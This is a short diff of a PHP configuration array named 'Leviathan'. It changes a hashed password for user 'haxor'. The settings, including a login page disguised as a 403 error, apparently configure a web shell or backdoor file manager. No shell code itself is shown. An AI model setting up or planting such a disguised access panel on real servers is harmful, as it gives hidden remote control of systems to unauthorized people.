@@ -2,7 +2,7 @@
 
 $GLOBALS['Leviathan'] = array(
     'username' => 'haxor',
-    'password' => 'a6d56740cfec46bbd88092bf36be3d7e',
+    'password' => '12a285c997495b02cc18d22d446e40b6',
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
